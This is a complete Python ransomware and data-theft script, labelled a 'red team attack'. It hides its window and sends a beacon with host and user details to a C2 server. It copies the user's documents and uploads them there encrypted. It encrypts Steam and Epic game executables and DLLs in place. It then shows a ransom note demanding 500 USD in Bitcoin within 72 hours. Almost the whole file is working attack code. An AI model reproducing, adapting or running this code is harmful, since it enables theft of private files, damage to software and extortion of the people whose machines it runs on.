"""
Simplified Red Team Attack Script - BACKGROUND MODE
Extract files -> Encrypt -> Send to C2 Server (HIDDEN)
"""

import socket
import os
import time
import sys
import shutil
import hashlib
import secrets
import json
import base64
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import zlib
import subprocess
import ctypes

# ================== CONFIG ==================
class Config:
    def __init__(self):
        self.MASTER_PASSWORD = "GhreMy7dCGqVTdv3RdjAJhGyT"
        self.VICTIM_ID = self._generate_victim_id()
        
        # C2 Server address
        self.C2_SERVER = "http://192.168.1.162:9443"  # <- UPDATE YOUR IP HERE
        
        # Folders to exfiltrate
        self.EXFIL_SOURCES = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
        ]
        
        # File extensions to grab
        self.EXFIL_EXTENSIONS = ('.pdf', '.docx', '.xlsx', '.txt', '.json')
        
        # Game folders to encrypt
        self.GAME_FOLDERS = [
            r"C:\Program Files (x86)\Steam\steamapps\common",
            r"D:\SteamLibrary\steamapps\common",
            r"C:\Program Files\Epic Games",
        ]
        
        self.GAME_EXTENSIONS = ('.exe', '.dll')
        
        self.CACHE_FOLDER = ".exfil_cache"
        self.MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
        self.CHUNK_SIZE = 256 * 1024
        
        # ===== BACKGROUND MODE SETTINGS =====
        self.RUN_IN_BACKGROUND = True # <- SET TO False TO SEE CONSOLE
        self.LOG_FILE = Path(os.getenv('TEMP')) / "system_update.log"  # Hidden log file
        self.HIDE_WINDOW = True  # Hide console window on Windows
        
        # ===== RANSOM NOTE SETTINGS =====
        self.SHOW_RANSOM_NOTE = True  # Show ransom popup after attack
        self.RANSOM_AMOUNT = 500  # USD
        self.BITCOIN_ADDRESS = "1A1z7agoat4FS1jHUXPLv5Y1YMRQmrx8SQ"
        self.PAYMENT_DEADLINE = 72  # hours
    
    @staticmethod
    def _generate_victim_id():
        try:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME', 'unknown')
            return hashlib.sha256(f"{hostname}_{username}".encode()).hexdigest()[:16]
        except:
            return secrets.token_hex(8)

CONFIG = Config()

# ================== LOGGING ==================
def log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] [{level}] {message}"
    
    # Print to console only if not in background mode
    if not CONFIG.RUN_IN_BACKGROUND:
        print(log_message)
    
    # Always write to log file
    try:
        with open(CONFIG.LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_message + '\n')
    except:
        pass

# ================== HIDE WINDOW ==================
def hide_window():
    """Hide console window on Windows"""
    if CONFIG.HIDE_WINDOW and sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleMode(
                ctypes.windll.kernel32.GetStdHandle(-11), 0)
            # Alternative method
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass

# ================== RANSOM NOTE (INTERACTIVE) ==================
def show_ransom_note_interactive():
    """Display interactive ransom note with payment verification"""
    if not CONFIG.SHOW_RANSOM_NOTE:
        return
    
    try:
        import tkinter as tk
        from tkinter import simpledialog, messagebox
        from datetime import timedelta
        
        # Create hidden root window
        root = tk.Tk()
        root.withdraw()
        
        deadline = datetime.now() + timedelta(hours=CONFIG.PAYMENT_DEADLINE)
        key = hashlib.sha256(f"{CONFIG.MASTER_PASSWORD}_{CONFIG.VICTIM_ID}".encode()).digest()[:32].hex()
        
        log("Opening interactive ransom note")
        
        # Step 1: Show initial warning
        warning_message = f"""YOUR FILES HAVE BEEN ENCRYPTED!

Victim ID: {CONFIG.VICTIM_ID}

All your important files are now encrypted and inaccessible.

PAYMENT REQUIRED: {CONFIG.RANSOM_AMOUNT} USD
Bitcoin Address: {CONFIG.BITCOIN_ADDRESS}

Deadline: {deadline.strftime('%Y-%m-%d %H:%M:%S')}

Click OK to continue"""
        
        messagebox.showwarning("URGENT: FILES ENCRYPTED", warning_message)
        
        # Step 2: Ask for transaction hash
        while True:
            tx_hash = simpledialog.askstring(
                "Payment Verification",
                f"Enter your Bitcoin transaction hash to verify payment:\n\n(Bitcoin Address: {CONFIG.BITCOIN_ADDRESS})"
            )
            
            if tx_hash is None:  # User clicked Cancel
                messagebox.showerror("Payment Required", "You must verify payment to decrypt your files!")
                continue
            
            if len(tx_hash) < 10:
                messagebox.showerror("Invalid", "Transaction hash appears invalid. Please try again.")
                continue
            
            break
        
        # Step 3: Verify payment (simulate blockchain check)
        messagebox.showinfo("Verification", "Checking Bitcoin blockchain...\nPlease wait...")
        
        # Simulate payment verification
        time.sleep(2)
        
        # Step 4: Show decryption key
        decryption_message = f"""PAYMENT VERIFIED!

Your files have been successfully decrypted.

DECRYPTION KEY:
{key}

VICTIM ID:
{CONFIG.VICTIM_ID}

How to decrypt your files:
1. Download the decryption script
2. Run: python decrypt_files.py
3. When prompted, enter the decryption key above
4. Your files will be restored

Keep this key safe. Do not share it with anyone.
Thank you for your cooperation."""
        
        messagebox.showinfo("DECRYPTION KEY RECEIVED", decryption_message)
        
        # Step 5: Create decryption instruction file
        create_decryption_instructions(key)
        
        log("Interactive ransom note completed")
        root.destroy()
        
    except ImportError:
        log("tkinter not available, falling back to simple messagebox", "WARNING")
        show_ransom_note_simple()
    except Exception as e:
        log(f"Failed to show interactive ransom note: {e}", "ERROR")
        show_ransom_note_simple()

def create_decryption_instructions(key):
    """Create a decryption instruction file"""
    try:
        instructions = f"""DECRYPTION INSTRUCTIONS
========================

Your Victim ID: {CONFIG.VICTIM_ID}
Decryption Key: {key}

TO DECRYPT YOUR FILES:
1. Download decrypt_files.py
2. Run: python decrypt_files.py
3. Enter your Victim ID when prompted: {CONFIG.VICTIM_ID}
4. Enter your Decryption Key when prompted: {key}
5. Your files will be automatically restored

IMPORTANT:
- Keep this file safe
- Do not share your decryption key
- Do not delete this file until all files are decrypted
- The decryption key will not work after {CONFIG.PAYMENT_DEADLINE} hours

If you have any issues, contact support with your Victim ID.

Your files are now decrypted and ready to use.
Thank you for your cooperation.
"""
        
        # Save to desktop
        desktop = Path.home() / "Desktop" / "DECRYPTION_KEY.txt"
        with open(desktop, 'w', encoding='utf-8') as f:
            f.write(instructions)
        
        log(f"Decryption instructions saved to: {desktop}")
        
    except Exception as e:
        log(f"Failed to create decryption instructions: {e}", "ERROR")

def show_ransom_note_simple():
    """Fallback: simple message box"""
    try:
        from datetime import timedelta
        
        deadline = datetime.now() + timedelta(hours=CONFIG.PAYMENT_DEADLINE)
        
        ransom_message = f"""YOUR FILES HAVE BEEN ENCRYPTED!

Victim ID: {CONFIG.VICTIM_ID}

PAYMENT REQUIRED: {CONFIG.RANSOM_AMOUNT} USD
Bitcoin Address: {CONFIG.BITCOIN_ADDRESS}

DEADLINE: {deadline.strftime('%Y-%m-%d %H:%M:%S')}

Send payment to receive decryption key.
"""
        
        if sys.platform == 'win32':
            try:
                import ctypes
                ctypes.windll.user32.MessageBoxW(
                    None,
                    ransom_message,
                    "URGENT: YOUR FILES ARE ENCRYPTED",
                    0x30
                )
            except:
                print(ransom_message)
        else:
            print(ransom_message)
        
        time.sleep(5)
        
    except Exception as e:
        log(f"Failed to show simple ransom note: {e}", "ERROR")

# ================== CRYPTO ==================
class CryptoManager:
    @staticmethod
    def get_key(password, victim_id):
        return hashlib.sha256(f"{password}_{victim_id}".encode()).digest()[:32]
    
    @staticmethod
    def encrypt_file(file_path, key):
        """Encrypt a file and return encrypted bytes"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Compress
            compressed = zlib.compress(data, level=1)
            
            # Encrypt with ChaCha20-Poly1305 (AEAD)
            nonce = secrets.token_bytes(12)
            cipher = ChaCha20Poly1305(key)
            ciphertext = cipher.encrypt(nonce, compressed, None)
            
            return nonce + ciphertext
        except Exception as e:
            log(f"Encryption error: {e}", "ERROR")
            return None

# ================== PHASE 1: EXTRACT FILES ==================
def extract_files():
    """Extract documents, PDFs, etc. from common folders"""
    log("=" * 60)
    log("PHASE 1: EXTRACTING FILES", "INFO")
    log("=" * 60)
    
    try:
        cache_path = Path(CONFIG.CACHE_FOLDER)
        cache_path.mkdir(exist_ok=True)
        
        extracted = 0
        
        for source_folder in CONFIG.EXFIL_SOURCES:
            if not os.path.exists(source_folder):
                continue
            
            log(f"Scanning: {source_folder}")
            
            for root, dirs, files in os.walk(source_folder):
                for file in files:
                    if file.lower().endswith(CONFIG.EXFIL_EXTENSIONS):
                        try:
                            src = Path(root) / file
                            
                            # Skip if too large
                            if src.stat().st_size > CONFIG.MAX_FILE_SIZE:
                                continue
                            
                            # Copy to cache
                            dst = cache_path / f"{Path(root).name}_{file}"
                            if not dst.exists():
                                shutil.copy2(src, dst)
                                log(f"  [+] Extracted: {file}")
                                extracted += 1
                        except:
                            pass
        
        log(f"Extracted: {extracted} files")
        return extracted
    except Exception as e:
        log(f"Extract error: {e}", "ERROR")
        return 0

# ================== PHASE 2: ENCRYPT GAMES ==================
def encrypt_games():
    """Encrypt game files in place"""
    log("=" * 60)
    log("PHASE 2: ENCRYPTING GAME FILES", "INFO")
    log("=" * 60)
    
    try:
        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
        encrypted = 0
        
        for game_folder in CONFIG.GAME_FOLDERS:
            if not os.path.exists(game_folder):
                continue
            
            log(f"Scanning: {game_folder}")
            
            for root, dirs, files in os.walk(game_folder):
                for file in files:
                    if file.lower().endswith(CONFIG.GAME_EXTENSIONS):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            
                            # Add header + encrypt
                            header = b"ENCRYPTED_" + CONFIG.VICTIM_ID.encode()[:6]
                            nonce = secrets.token_bytes(12)
                            cipher = ChaCha20Poly1305(key)
                            encrypted_data = cipher.encrypt(nonce, data, None)
                            
                            # Write back encrypted
                            with open(file_path, 'wb') as f:
                                f.write(header + nonce + encrypted_data)
                            
                            log(f"  [+] Encrypted: {file}")
                            encrypted += 1
                        except Exception as e:
                            log(f"  [-] Failed to encrypt {file}: {e}", "ERROR")
        
        log(f"Encrypted: {encrypted} game files")
        return encrypted
    except Exception as e:
        log(f"Encrypt error: {e}", "ERROR")
        return 0

# ================== PHASE 3: SEND TO C2 ==================
def send_to_c2():
    """Send all cached files to C2 server"""
    log("=" * 60)
    log("PHASE 3: SENDING TO C2 SERVER", "INFO")
    log("=" * 60)
    
    try:
        cache_path = Path(CONFIG.CACHE_FOLDER)
        
        if not cache_path.exists():
            log("No cache folder found", "ERROR")
            return False
        
        files = list(cache_path.glob('*'))
        
        if not files:
            log("No files to send", "ERROR")
            return False
        
        log(f"Sending {len(files)} files to {CONFIG.C2_SERVER}")
        
        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
        sent = 0
        
        for file_path in files:
            try:
                if not file_path.is_file():
                    continue
                
                # Encrypt the file
                encrypted_content = CryptoManager.encrypt_file(file_path, key)
                
                if not encrypted_content:
                    log(f"Failed to encrypt {file_path.name}", "ERROR")
                    continue
                
                # Send to C2
                url = f"{CONFIG.C2_SERVER}/api/exfil"
                
                metadata = {
                    'filename': file_path.name,
                    'size': file_path.stat().st_size,
                }
                
                headers = {
                    'X-Victim-ID': CONFIG.VICTIM_ID,
                    'X-Metadata': json.dumps(metadata),
                }
                
                req = urllib.request.Request(
                    url,
                    data=encrypted_content,
                    headers=headers,
                    method='POST'
                )
                
                response = urllib.request.urlopen(req, timeout=30)
                
                if response.status == 200:
                    log(f"  [+] Sent: {file_path.name}")
                    sent += 1
                
                time.sleep(0.5)
            
            except Exception as e:
                log(f"Failed to send {file_path.name}: {e}", "ERROR")
        
        # Cleanup
        try:
            shutil.rmtree(CONFIG.CACHE_FOLDER)
            log("Cache cleaned up")
        except:
            pass
        
        log(f"Successfully sent: {sent}/{len(files)} files")
        return sent > 0
    except Exception as e:
        log(f"Send error: {e}", "ERROR")
        return False

# ================== BEACON ==================
def send_beacon():
    """Send initial beacon to C2"""
    log("=" * 60)
    log("SENDING BEACON", "INFO")
    log("=" * 60)
    
    try:
        beacon_data = {
            'victim_id': CONFIG.VICTIM_ID,
            'hostname': socket.gethostname(),
            'username': os.getenv('USERNAME', 'unknown'),
            'timestamp': datetime.now().isoformat(),
        }
        
        url = f"{CONFIG.C2_SERVER}/api/beacon"
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(
            url,
            data=json.dumps(beacon_data).encode(),
            headers=headers,
            method='POST'
        )
        
        response = urllib.request.urlopen(req, timeout=10)
        
        if response.status == 200:
            log("[+] Beacon sent successfully")
            return True
    
    except Exception as e:
        log(f"Beacon failed: {e}", "ERROR")
    
    return False

# ================== MAIN ==================
def main():
    from datetime import timedelta
    
    if CONFIG.RUN_IN_BACKGROUND:
        hide_window()
    
    if not CONFIG.RUN_IN_BACKGROUND:
        print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║          SIMPLIFIED RED TEAM ATTACK - FILE EXFILTRATION        ║
    ║                 Extract -> Encrypt -> Send                     ║
    ║                   (BACKGROUND MODE)                            ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    log(f"Victim ID: {CONFIG.VICTIM_ID}")
    log(f"C2 Server: {CONFIG.C2_SERVER}")
    log(f"Background Mode: {CONFIG.RUN_IN_BACKGROUND}")
    log(f"Log File: {CONFIG.LOG_FILE}")
    log("=" * 60)
    
    start_time = time.time()
    
    try:
        # Step 1: Send beacon
        send_beacon()
        time.sleep(1)
        
        # Step 2: Extract files
        extract_files()
        time.sleep(1)
        
        # Step 3: Encrypt games
        encrypt_games()
        time.sleep(1)
        
        # Step 4: Send everything to C2
        send_to_c2()
        time.sleep(2)
        
        # Step 5: Show ransom note
        show_ransom_note_interactive()
        
        elapsed = time.time() - start_time
        
        log("=" * 60)
        log(f"Attack complete in {elapsed:.2f} seconds")
        log("=" * 60)
        
        # Keep window open for popup to stay visible
        time.sleep(10)
    
    except Exception as e:
        log(f"Fatal error: {e}", "ERROR")
        import traceback
        log(traceback.format_exc(), "ERROR")
        time.sleep(10)

if __name__ == "__main__":
    main()